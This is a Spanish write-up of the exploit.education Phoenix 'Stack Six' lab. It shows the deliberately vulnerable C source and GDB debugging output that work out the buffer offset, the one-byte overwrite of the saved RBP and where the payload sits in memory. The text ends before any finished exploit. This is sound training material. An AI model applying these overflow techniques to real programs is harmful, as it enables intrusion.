---
layout: single
title: "Stack Six"
permalink: /pwn/phoenix/stack-six/
parent: Phoenix
comments: true
excerpt: "Stack Six"
classes: wide
header:
  teaser: /assets/images/2025-08-17-Phoenix/logo.jpg
categories: [PWN]
tags: [PWN, Linux, Hacking, Easy]
---

![Untitled](/assets/images/2025-08-17-Phoenix/banner.png)


- ¿Dónde se equivoca Stack Six y qué puedes hacer con él?
- Dependiendo de la arquitectura en la que estés haciendo esto, puede que necesites explorar más y ser creativo con la forma de resolver este nivel.

- La macro GREET depende de la arquitectura

### Análisis del código

El programa contiene:

- Un buffer de 128 bytes en la función `greet()`.
- Uso combinado de `strcpy()` y `strncpy()` sin validar correctamente los límites.
- El contenido de la variable global `what` se copia primero al buffer, seguido de la entrada del usuario (`who`).
- Si se compila con la macro `NEWARCH`, es posible modificar `what` desde los argumentos de línea de comandos.
- Esta falta de control permite un **buffer overflow**, lo que abre la posibilidad de inyectar y ejecutar código arbitrario (por ejemplo, llamar a `execve("/bin/sh", ...)`) para completar el reto.

```csharp
/*
 * phoenix/stack-six, by https://exploit.education
 *
 * Can you execve("/bin/sh", ...) ?
 *
 * Why do fungi have to pay double bus fares? Because they take up too
 * mushroom.
 */

#include <err.h>       // Incluye funciones para mostrar errores y terminar el programa (err, errx, etc.)
#include <stdio.h>     // Incluye funciones de entrada/salida estándar (printf, etc.)
#include <stdlib.h>    // Incluye funciones de utilidad como getenv(), malloc(), etc.
#include <string.h>    // Incluye funciones para manejo de strings (strlen, strcpy, strncpy, etc.)
#include <unistd.h>    // Incluye funciones del sistema como execve(), etc.

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"
// Define una cadena constante con un mensaje de bienvenida

char *what = GREET; // Puntero a char inicializado con GREET (probablemente definido en un macro al compilar)

char *greet(char *who) {                // Función greet que recibe un puntero a char (nombre)
  char buffer[128];                     // Declara un buffer local de 128 bytes
  int maxSize;                          // Variable para tamaño máximo permitido

  maxSize = strlen(who);                // maxSize se iguala a la longitud de "who"
  if (maxSize > (sizeof(buffer) - 1)) { // Si la longitud es mayor que el tamaño del buffer menos 1
    maxSize = sizeof(buffer) - 1;       // Ajusta maxSize para evitar desbordar y dejar espacio para '\0'
  }

  strcpy(buffer, what);                 // Copia el contenido de "what" dentro del buffer
  strncpy(buffer + strlen(buffer),      // Copia a partir del final del contenido ya copiado
          who,                          // Lo que viene de "who"
          maxSize);                     // Hasta maxSize caracteres

  return strdup(buffer);                // Duplica el contenido del buffer en memoria dinámica y lo retorna
}

int main(int argc, char **argv) {       // Función principal
  char *ptr;                            // Puntero para almacenar valor de variable de entorno
  printf("%s\n", BANNER);               // Imprime el mensaje de bienvenida

#ifdef NEWARCH                          // Si se compiló con la macro NEWARCH definida
  if (argv[1]) {                        // Si hay argumento en la línea de comandos
    what = argv[1];                     // Cambia "what" para apuntar a ese argumento
  }
#endif

  ptr = getenv("ExploitEducation");     // Busca la variable de entorno "ExploitEducation"
  if (NULL == ptr) {                    // Si no existe esa variable de entorno
    errx(1, "Please specify an environment variable called ExploitEducation");
    // Muestra un error y termina con código de salida 1
  }

  printf("%s\n", greet(ptr));           // Llama a greet con el valor de la variable de entorno y lo imprime
  return 0;                             // Termina el programa
}
```

Se asigna a la variable de entorno `ExploitEducation` una cadena de 127 caracteres `'A'`, usando Python para generarla. Esto permite verificar el comportamiento del programa cuando la función `greet()` recibe una entrada cercana al tamaño máximo del buffer (128 bytes).

```csharp
user@phoenix-amd64:/opt/phoenix/amd64$ export ExploitEducation=$(python -c "print 'A'*127")
user@phoenix-amd64:/opt/phoenix/amd64$ echo $ExploitEducation
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
user@phoenix-amd64:/opt/phoenix/amd64$
```

Se abre el binario `stack-six` en **GDB** con el fin de iniciar la depuración y analizar en detalle cómo se comporta el programa al manejar la entrada de la variable de entorno vulnerable.

```csharp
user@phoenix-amd64:/opt/phoenix/amd64$ gdb -q /opt/phoenix/amd64/stack-six 
GEF for linux ready, type `gef' to start, `gef config' to configure
71 commands loaded for GDB 8.2.1 using Python engine 3.5
[*] 2 commands could not be loaded, run `gef missing` to know why.
Reading symbols from /opt/phoenix/amd64/stack-six...(no debugging symbols found)...done.
gef➤
```

Se desensambla la función `main` para comprender el flujo de ejecución del programa. luego, se coloca un **breakpoint** en la instrucción `0x4007e9` (`mov rdi, rax`), con el objetivo de inspeccionar el valor retornado por la función `greet()`.

```csharp
gef➤  disass main
Dump of assembler code for function main:
   0x000000000040079b <+0>:	push   rbp
   0x000000000040079c <+1>:	mov    rbp,rsp
   0x000000000040079f <+4>:	sub    rsp,0x20
   0x00000000004007a3 <+8>:	mov    DWORD PTR [rbp-0x14],edi
   0x00000000004007a6 <+11>:	mov    QWORD PTR [rbp-0x20],rsi
   0x00000000004007aa <+15>:	mov    edi,0x400878
   0x00000000004007af <+20>:	call   0x400530 <puts@plt>
   0x00000000004007b4 <+25>:	mov    edi,0x4008c2
   0x00000000004007b9 <+30>:	call   0x400520 <getenv@plt>
   0x00000000004007be <+35>:	mov    QWORD PTR [rbp-0x8],rax
   0x00000000004007c2 <+39>:	cmp    QWORD PTR [rbp-0x8],0x0
   0x00000000004007c7 <+44>:	jne    0x4007dd <main+66>
   0x00000000004007c9 <+46>:	mov    esi,0x4008d8
   0x00000000004007ce <+51>:	mov    edi,0x1
   0x00000000004007d3 <+56>:	mov    eax,0x0
   0x00000000004007d8 <+61>:	call   0x400540 <errx@plt>
   0x00000000004007dd <+66>:	mov    rax,QWORD PTR [rbp-0x8]
   0x00000000004007e1 <+70>:	mov    rdi,rax
   0x00000000004007e4 <+73>:	call   0x4006fd <greet>
   0x00000000004007e9 <+78>:	mov    rdi,rax
   0x00000000004007ec <+81>:	call   0x400530 <puts@plt>
   0x00000000004007f1 <+86>:	mov    eax,0x0
   0x00000000004007f6 <+91>:	leave  
   0x00000000004007f7 <+92>:	ret    
End of assembler dump.

```

Se desensambla la función `greet` para analizar cómo maneja el buffer interno. vemos la instrucción `0x400782` (`lea rax,[rbp-0xa0]`), con el fin de inspeccionar directamente la dirección del buffer donde se almacenan los caracteres provenientes de la variable de entorno `ExploitEducation`.

La dirección `[rbp-0xa0]` marca el inicio del buffer local de 128 bytes reservado en la pila. Esto significa que todos los datos que ingresemos en el programa se almacenan a partir de esa posición de memoria. Al sobrepasar los 128 bytes, empezamos a pisar el resto del stack frame, incluyendo el `RBP` guardado y la dirección de retorno.

```csharp
gef➤  disass greet
Dump of assembler code for function greet:
   0x00000000004006fd <+0>:	push   rbp
   0x00000000004006fe <+1>:	mov    rbp,rsp
   0x0000000000400701 <+4>:	push   rbx
   0x0000000000400702 <+5>:	sub    rsp,0xa8
   0x0000000000400709 <+12>:	mov    QWORD PTR [rbp-0xa8],rdi
   0x0000000000400710 <+19>:	mov    rax,QWORD PTR [rbp-0xa8]
   0x0000000000400717 <+26>:	mov    rdi,rax
   0x000000000040071a <+29>:	call   0x400580 <strlen@plt>
   0x000000000040071f <+34>:	mov    DWORD PTR [rbp-0x14],eax
   0x0000000000400722 <+37>:	mov    eax,DWORD PTR [rbp-0x14]
   0x0000000000400725 <+40>:	cmp    eax,0x7f
   0x0000000000400728 <+43>:	jbe    0x400731 <greet+52>
   0x000000000040072a <+45>:	mov    DWORD PTR [rbp-0x14],0x7f
   0x0000000000400731 <+52>:	mov    rdx,QWORD PTR [rip+0x200458]        # 0x600b90 <what>
   0x0000000000400738 <+59>:	lea    rax,[rbp-0xa0]
   0x000000000040073f <+66>:	mov    rsi,rdx
   0x0000000000400742 <+69>:	mov    rdi,rax
   0x0000000000400745 <+72>:	call   0x400510 <strcpy@plt>
   0x000000000040074a <+77>:	mov    eax,DWORD PTR [rbp-0x14]
   0x000000000040074d <+80>:	movsxd rbx,eax
   0x0000000000400750 <+83>:	lea    rax,[rbp-0xa0]
   0x0000000000400757 <+90>:	mov    rdi,rax
   0x000000000040075a <+93>:	call   0x400580 <strlen@plt>
   0x000000000040075f <+98>:	mov    rdx,rax
   0x0000000000400762 <+101>:	lea    rax,[rbp-0xa0]
   0x0000000000400769 <+108>:	lea    rcx,[rax+rdx*1]
   0x000000000040076d <+112>:	mov    rax,QWORD PTR [rbp-0xa8]
   0x0000000000400774 <+119>:	mov    rdx,rbx
   0x0000000000400777 <+122>:	mov    rsi,rax
   0x000000000040077a <+125>:	mov    rdi,rcx
   0x000000000040077d <+128>:	call   0x400550 <strncpy@plt>
   0x0000000000400782 <+133>:	lea    rax,[rbp-0xa0]
   0x0000000000400789 <+140>:	mov    rdi,rax
   0x000000000040078c <+143>:	call   0x400560 <strdup@plt>
   0x0000000000400791 <+148>:	add    rsp,0xa8
   0x0000000000400798 <+155>:	pop    rbx
   0x0000000000400799 <+156>:	pop    rbp
   0x000000000040079a <+157>:	ret    
End of assembler dump.
gef➤ 
```

Se coloca un breakpoint en la dirección `0x400782` dentro de la función `greet`. Este punto corresponde a la instrucción `lea rax, [rbp-0xa0]`, que carga en `rax` la dirección del buffer local de 128 bytes reservado en la pila. Al detener la ejecución aquí, podremos inspeccionar y confirmar la ubicación del buffer antes de que se realice la copia de datos con `strncpy()`.

```csharp
gef➤  b *0x0000000000400782
Breakpoint 1 at 0x400782
gef➤ 
```

Se ejecuta el programa con `run` (`r`), deteniéndose en el breakpoint dentro de `greet`. En este punto, los registros y la pila muestran cómo la cadena de `'A'` cargada desde la variable de entorno `ExploitEducation` ya se encuentra copiada en el buffer local de 128 bytes. Esto confirma que el desbordamiento afecta directamente a la pila, lo que permitirá manipular el flujo de ejecución en los siguientes pasos.

```csharp
gef➤  r
Starting program: /opt/phoenix/amd64/stack-six 
Welcome to phoenix/stack-six, brought to you by https://exploit.education

Breakpoint 1, 0x0000000000400782 in greet ()
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00007fffffffe512  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$rbx   : 0x7f              
$rcx   : 0x00007fffffffe512  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$rdx   : 0x0               
$rsp   : 0x00007fffffffe4e0  →  0x00007ffff7ffc948  →  "Welcome to phoenix/stack-six, brought to you by ht[...]"
$rbp   : 0x00007fffffffe590  →  0x00007fffffffe541  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$rsi   : 0x0               
$rdi   : 0x00007fffffffe591  →  0xe900007fffffffe5
$rip   : 0x0000000000400782  →  <greet+133> lea rax, [rbp-0xa0]
$r8    : 0x101010101010101 
$r9    : 0xfefefefefefefeff
$r10   : 0x0               
$r11   : 0x202             
$r12   : 0x00007fffffffe628  →  0x00007fffffffe82e  →  "LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so[...]"
$r13   : 0x000000000040079b  →  <main+0> push rbp
$r14   : 0x0               
$r15   : 0x0               
$eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffe4e0│+0x0000: 0x00007ffff7ffc948  →  "Welcome to phoenix/stack-six, brought to you by ht[...]"	 ← $rsp
0x00007fffffffe4e8│+0x0008: 0x00007fffffffef10  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x00007fffffffe4f0│+0x0010: "Welcome, I am pleased to meet you AAAAAAAAAAAAAAAA[...]"
0x00007fffffffe4f8│+0x0018: "I am pleased to meet you AAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x00007fffffffe500│+0x0020: "eased to meet you AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x00007fffffffe508│+0x0028: "meet you AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x00007fffffffe510│+0x0030: "u AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x00007fffffffe518│+0x0038: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400777 <greet+122>      mov    rsi, rax
     0x40077a <greet+125>      mov    rdi, rcx
     0x40077d <greet+128>      call   0x400550 <strncpy@plt>
 →   0x400782 <greet+133>      lea    rax, [rbp-0xa0]
     0x400789 <greet+140>      mov    rdi, rax
     0x40078c <greet+143>      call   0x400560 <strdup@plt>
     0x400791 <greet+148>      add    rsp, 0xa8
     0x400798 <greet+155>      pop    rbx
     0x400799 <greet+156>      pop    rbp
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "stack-six", stopped, reason: BREAKPOINT
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x400782 → greet()
[#1] 0x4007e9 → main()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  
```

Se imprime la dirección del buffer local en `greet` mediante `$rbp-0xa0`, obteniendo `0x7fffffffe50`. Esta dirección será clave para la construcción del payload, ya que corresponde al inicio del espacio en la pila donde se copian los datos de entrada.

```csharp
gef➤   print $rbp-0xa0
$1 = (void *) 0x7fffffffe520
gef➤  
```

Se visualiza el contenido del buffer en formato string usando `x/s $rbp-0xa0`. Se observa el mensaje inicial `"Welcome, I am pleased to meet you "` concatenado con las 127 `'A'` copiadas desde la variable de entorno, seguido de los bytes residuales que permanecen en memoria.

```csharp
gef➤  x/s $rbp-0xa0
0x7fffffffe520:	"Welcome, I am pleased to meet you ", 'A' <repeats 127 times>, "\345\377\377\377\177"
gef➤
```

Se inspecciona la memoria del buffer con `x/22xg $rbp-0xa0`. La salida muestra cómo las 127 `'A'` inyectadas llenan el espacio reservado hasta alcanzar la zona de control de la pila, sobrescribiendo el **saved RBP** en `0x00007fffffffe541` y el **saved RIP** (dirección de retorno) en `0x00000000004007e9`.

```csharp
gef➤  x/22xg $rbp-0xa0
0x7fffffffe520:	0x2c656d6f636c6557	0x6c70206d61204920
0x7fffffffe530:	0x6f74206465736165	0x6f79207465656d20
0x7fffffffe540:	0x4141414141412075	0x4141414141414141
0x7fffffffe550:	0x4141414141414141	0x4141414141414141
0x7fffffffe560:	0x4141414141414141	0x4141414141414141
0x7fffffffe570:	0x4141414141414141	0x4141414141414141
0x7fffffffe580:	0x4141414141414141	0x4141414141414141
0x7fffffffe590:	0x4141414141414141	0x4141414141414141
0x7fffffffe5a0:	0x4141414141414141	0x4141414141414141
0x7fffffffe5b0:	0x4141414141414141	0x4141414141414141
0x7fffffffe5c0:	0x00007fffffffe541	0x00000000004007e9
gef➤
```

Se utiliza `info frame` para confirmar las ubicaciones de control en la pila del frame actual (`greet`). El **saved RIP** apunta a `0x4007e9` (retorno a `main`) y está almacenado en `0x7fffffffe5c8`, mientras que el **saved RBP** está en `0x7fffffffe5c0` (apuntando al frame previo). Esto corrobora lo visto en el volcado de memoria: el buffer crece hasta alcanzar y poder sobrescribir primero el `saved RBP` y, a continuación, la dirección de retorno.

```csharp
gef➤  info frame
Stack level 0, frame at 0x7fffffffe5d0:
 rip = 0x400782 in greet; saved rip = 0x4007e9
 called by frame at 0x7fffffffe551
 Arglist at 0x7fffffffe5c0, args: 
 Locals at 0x7fffffffe5c0, Previous frame's sp is 0x7fffffffe5d0
 Saved registers:
  rbx at 0x7fffffffe5b8, rbp at 0x7fffffffe5c0, rip at 0x7fffffffe5c8
gef➤
```

Para calcular el tamaño exacto del buffer en la pila, primero se guarda su dirección en una variable (`$buf = $rbp-0xa0`). Luego se imprime el valor de `$rbp` y finalmente se calcula la diferencia entre ambos punteros.

El resultado es **160 bytes**, lo que significa que el buffer local en `greet` ocupa 160 bytes desde su inicio en `$rbp-0xa0` hasta justo antes del `saved RBP`.

Esto confirma que tenemos un **offset de 160** para alcanzar el `saved RBP`, y con 8 bytes más podremos sobrescribir el `saved RIP`.

```csharp
gef➤  set $buf = $rbp-0xa0
gef➤  p/x $buf
$2 = 0x7fffffffe520     # es la dirección del buffer
gef➤  p/x $rbp
$3 = 0x7fffffffe5c0     # Dirección saved rbp
gef➤  p/d $rbp - $buf
$4 = 160                # Tamaño del buffer
gef➤  

```

Se calcula el tamaño del mensaje de bienvenida `"Welcome, I am pleased to meet you "` utilizando Python.

El resultado muestra que la cadena ocupa **34 bytes**, los cuales forman parte del contenido inicial almacenado en el buffer antes de que se copien los caracteres de entrada del usuario.

```csharp
┌──(root㉿angussMoody)-[/mnt/angussMoody]
└─# python3
Python 3.13.5 (main, Jun 25 2025, 18:55:22) [GCC 14.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> len("Welcome, I am pleased to meet you ")
34
```

Se determina la cantidad de caracteres necesarios para alcanzar el **saved RBP**.

- El buffer local ocupa **160 bytes** hasta llegar al `saved RBP`.
- El mensaje de bienvenida tiene **34 bytes**.
- La función `strncpy` añade **127 caracteres `'A'`**.

En total, se escriben **161 bytes**, lo que provoca que se sobrescriba **1 byte del `saved RBP`**.

Este pequeño desbordamiento ya es suficiente para alterar la pila y, con ello, abrir la puerta a controlar el flujo de ejecución.

```csharp
Total escrito = 34 + 127 = 161 bytes
Overflow sobre saved RBP = 161 - 160 = 1 byte
```

**Nota Importante** 

Antes de continuar con la explotación, es recomendable normalizar el entorno en GDB, ya que variables como `LINES`, `COLUMNS` o `_` pueden alterar la disposición del stack y dificultar la explotación. De esta forma, las direcciones de la pila permanecerán consistentes dentro y fuera del depurador

```csharp
gef➤  unset env LINES
gef➤  unset env COLUMNS
gef➤  set env _ /opt/phoenix/amd64/stack-six
```

El **1 byte sobrescrito** corresponde al **LSB del `saved RBP`** (`0x7fffffffe5a0`), mientras que el **`saved RIP`** en `[rbp+8]` permanece intacto en `0x4007e9`, tal como confirma el comando `info frame`.

Además, la inspección de la variable de entorno `ExploitEducation` en memoria muestra que los `'A'` se copiaron correctamente hasta la pila.

Esto valida que el payload alcanza el stack y que ya es posible **influir parcialmente en el flujo de ejecución**.

```csharp
gef➤  grep ExploitEducation=
[+] Searching 'ExploitEducation=' in memory
[+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rwx
  0x7fffffffeeff - 0x7fffffffef36  →   "ExploitEducation=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]" 
gef➤  
```

Se calcula la dirección donde inicia el **payload** en memoria sumando la dirección base de la variable de entorno `ExploitEducation` (`0x7fffffffeeff`) con la longitud del prefijo `"ExploitEducation="`.

El resultado es `0x7fffffffef10`, que corresponde a la dirección exacta donde comienzan los `'A'`. Esta referencia será clave para ubicar el payload durante la explotación.

```csharp
──(root㉿angussMoody)-[/mnt/angussMoody/pwn_the-ingredient-shop]
└─# python3
Python 3.13.5 (main, Jun 25 2025, 18:55:22) [GCC 14.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> print(hex(0x7fffffffeeff + len("ExploitEducation=")))
0x7fffffffef10
>>>
```

Se coloca un **breakpoint en `0x4007be`** (`mov QWORD PTR [rbp-0x8], rax`) dentro de `main`.

Este punto es importante porque aquí se guarda en la pila el valor retornado por `getenv("ExploitEducation")`. Al detener la ejecución en esta instrucción podemos confirmar que el registro `rax` contiene la dirección exacta donde inicia el **payload** (los `'A'` de la variable de entorno), que luego será pasado como argumento a `greet()`.

```csharp
gef➤  disass main
Dump of assembler code for function main:
   0x000000000040079b <+0>:	push   rbp
   0x000000000040079c <+1>:	mov    rbp,rsp
   0x000000000040079f <+4>:	sub    rsp,0x20
   0x00000000004007a3 <+8>:	mov    DWORD PTR [rbp-0x14],edi
   0x00000000004007a6 <+11>:	mov    QWORD PTR [rbp-0x20],rsi
   0x00000000004007aa <+15>:	mov    edi,0x400878
   0x00000000004007af <+20>:	call   0x400530 <puts@plt>
   0x00000000004007b4 <+25>:	mov    edi,0x4008c2
   0x00000000004007b9 <+30>:	call   0x400520 <getenv@plt>
   0x00000000004007be <+35>:	mov    QWORD PTR [rbp-0x8],rax
   0x00000000004007c2 <+39>:	cmp    QWORD PTR [rbp-0x8],0x0
   0x00000000004007c7 <+44>:	jne    0x4007dd <main+66>
   0x00000000004007c9 <+46>:	mov    esi,0x4008d8
   0x00000000004007ce <+51>:	mov    edi,0x1
   0x00000000004007d3 <+56>:	mov    eax,0x0
   0x00000000004007d8 <+61>:	call   0x400540 <errx@plt>
   0x00000000004007dd <+66>:	mov    rax,QWORD PTR [rbp-0x8]
   0x00000000004007e1 <+70>:	mov    rdi,rax
   0x00000000004007e4 <+73>:	call   0x4006fd <greet>
   0x00000000004007e9 <+78>:	mov    rdi,rax
   0x00000000004007ec <+81>:	call   0x400530 <puts@plt>
   0x00000000004007f1 <+86>:	mov    eax,0x0
   0x00000000004007f6 <+91>:	leave  
   0x00000000004007f7 <+92>:	ret    
End of assembler dump.
gef➤  b *0x00000000004007be
Breakpoint 2 at 0x4007be
gef➤  
```

Se ejecuta el binario con `run` o `r` y, al detenerse en el breakpoint en `0x4007be`, se confirma que el **registro `$rax` contiene la dirección del payload**.

En este caso, `$rax = 0x7fffffffef10`, que apunta exactamente al inicio de la cadena de `'A'` cargada desde la variable de entorno `ExploitEducation`.

Esto asegura que el payload ya está disponible en memoria y será usado como argumento para la función `greet()`.

```csharp
gef➤  r
Starting program: /opt/phoenix/amd64/stack-six 
Welcome to phoenix/stack-six, brought to you by https://exploit.education

Breakpoint 2, 0x00000000004007be in main ()
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00007fffffffef10  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$rbx   : 0x00007fffffffe618  →  0x00007fffffffe811  →  "/opt/phoenix/amd64/stack-six"
$rcx   : 0x6e              
$rdx   : 0xf               
$rsp   : 0x00007fffffffe5a0  →  0x00007fffffffe618  →  0x00007fffffffe811  →  "/opt/phoenix/amd64/stack-six"
$rbp   : 0x00007fffffffe5c0  →  0x0000000000000001
$rsi   : 0x00007fffffffeeff  →  "ExploitEducation=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$rdi   : 0x00000000004008c2  →  "ExploitEducation"
$rip   : 0x00000000004007be  →  <main+35> mov QWORD PTR [rbp-0x8], rax
$r8    : 0x6e              
$r9    : 0x1               
$r10   : 0x0               
$r11   : 0x202             
$r12   : 0x00007fffffffe628  →  0x00007fffffffe82e  →  "LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so[...]"
$r13   : 0x000000000040079b  →  <main+0> push rbp
$r14   : 0x0               
$r15   : 0x0               
$eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffe5a0│+0x0000: 0x00007fffffffe618  →  0x00007fffffffe811  →  "/opt/phoenix/amd64/stack-six"	 ← $rsp
0x00007fffffffe5a8│+0x0008: 0x00000001ffffe628
0x00007fffffffe5b0│+0x0010: 0x000000000040079b  →  <main+0> push rbp
0x00007fffffffe5b8│+0x0018: 0x0000000000000000
0x00007fffffffe5c0│+0x0020: 0x0000000000000001	 ← $rbp
0x00007fffffffe5c8│+0x0028: 0x00007ffff7d8fd62  →  <__libc_start_main+54> mov edi, eax
0x00007fffffffe5d0│+0x0030: 0x0000000000000000
0x00007fffffffe5d8│+0x0038: 0x00007fffffffe610  →  0x0000000000000001
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4007af <main+20>        call   0x400530 <puts@plt>
     0x4007b4 <main+25>        mov    edi, 0x4008c2
     0x4007b9 <main+30>        call   0x400520 <getenv@plt>
 →   0x4007be <main+35>        mov    QWORD PTR [rbp-0x8], rax
     0x4007c2 <main+39>        cmp    QWORD PTR [rbp-0x8], 0x0
     0x4007c7 <main+44>        jne    0x4007dd <main+66>
     0x4007c9 <main+46>        mov    esi, 0x4008d8
     0x4007ce <main+51>        mov    edi, 0x1
     0x4007d3 <main+56>        mov    eax, 0x0
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "stack-six", stopped, reason: BREAKPOINT
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4007be → main()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤ 
```

Ejecutamos de nuevo con gdb y colocamos un **breakpoint en la instrucción `leave` de `main`** (`0x4007f6`) para detener la ejecución justo antes de restaurar el `rbp` y retornar.

Esto permite inspeccionar cómo queda la pila después del overflow y verificar si se ha alcanzado control sobre el **saved RIP**, ya que en este punto la función `main` está a un paso de ejecutar la instrucción `ret`.

```csharp
gef➤  disass main
Dump of assembler code for function main:
   0x000000000040079b <+0>:	push   rbp
   0x000000000040079c <+1>:	mov    rbp,rsp
   0x000000000040079f <+4>:	sub    rsp,0x20
   0x00000000004007a3 <+8>:	mov    DWORD PTR [rbp-0x14],edi
   0x00000000004007a6 <+11>:	mov    QWORD PTR [rbp-0x20],rsi
   0x00000000004007aa <+15>:	mov    edi,0x400878
   0x00000000004007af <+20>:	call   0x400530 <puts@plt>
   0x00000000004007b4 <+25>:	mov    edi,0x4008c2
   0x00000000004007b9 <+30>:	call   0x400520 <getenv@plt>
   0x00000000004007be <+35>:	mov    QWORD PTR [rbp-0x8],rax
   0x00000000004007c2 <+39>:	cmp    QWORD PTR [rbp-0x8],0x0
   0x00000000004007c7 <+44>:	jne    0x4007dd <main+66>
   0x00000000004007c9 <+46>:	mov    esi,0x4008d8
   0x00000000004007ce <+51>:	mov    edi,0x1
   0x00000000004007d3 <+56>:	mov    eax,0x0
   0x00000000004007d8 <+61>:	call   0x400540 <errx@plt>
   0x00000000004007dd <+66>:	mov    rax,QWORD PTR [rbp-0x8]
   0x00000000004007e1 <+70>:	mov    rdi,rax
   0x00000000004007e4 <+73>:	call   0x4006fd <greet>
   0x00000000004007e9 <+78>:	mov    rdi,rax
   0x00000000004007ec <+81>:	call   0x400530 <puts@plt>
   0x00000000004007f1 <+86>:	mov    eax,0x0
   0x00000000004007f6 <+91>:	leave  
   0x00000000004007f7 <+92>:	ret    
End of assembler dump.
gef➤  b *0x00000000004007f6
Breakpoint 1 at 0x4007f6
gef➤ 
```

Se ejecuta el binario con `r` y para en el **breakpoint en la instrucción `leave`**, se observa el estado de los registros y la pila:

- `$rbp = 0x7fffffffe541` → corresponde al **saved RBP** que fue sobrescrito parcialmente con `'A'`.
- `[rbp+8] = 0x4007f6`→ contiene el **saved RIP original**, que apunta a la instrucción siguiente al `call greet`.
- El **payload** con las `'A'` se encuentra ya en la pila, en `0x00007fffffffe5e8`, confirmando que la entrada del entorno fue copiada exitosamente.

Esto confirma lo siguiente:

1. El **overflow alcanzó y corrompió el saved RBP**, evidenciado por el valor `0x7fffffffe541`.
2. Todavía no se ha sobrescrito el saved RIP, pero estamos a solo **1 byte de lograrlo**.
3. El payload ya está en memoria (`0x7fffffffef10`), lo que abre la posibilidad de usarlo como shellcode o como referencia en un **ret2payload / ret2shellcode**.

```csharp
gef➤  r
Starting program: /opt/phoenix/amd64/stack-six 
Welcome to phoenix/stack-six, brought to you by https://exploit.education
Welcome, I am pleased to meet you AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����

Breakpoint 1, 0x00000000004007f6 in main ()
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0               
$rbx   : 0x4141414141414141 ("AAAAAAAA"?)
$rcx   : 0x00007ffff7db6d07  →  <__stdio_write+83> mov rdi, rax
$rdx   : 0x0               
$rsp   : 0x00007fffffffe5b0  →  0x00007fffffffe628  →  0x00007fffffffe82b  →  "/opt/phoenix/amd64/stack-six"
$rbp   : 0x00007fffffffe541  →  0x0000000000000000
$rsi   : 0x00007fffffffe510  →  0x00007ffff7ffc948  →  "Welcome, I am pleased to meet you AAAAAAAAAAAAAAAA[...]"
$rdi   : 0xa7              
$rip   : 0x00000000004007f6  →  <main+91> leave 
$r8    : 0x0000000000600c00  →  "Welcome, I am pleased to meet you AAAAAAAAAAAAAAAA[...]"
$r9    : 0xfefefefefefefeff
$r10   : 0x0               
$r11   : 0x202             
$r12   : 0x00007fffffffe638  →  0x00007fffffffe848  →  "LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so[...]"
$r13   : 0x000000000040079b  →  <main+0> push rbp
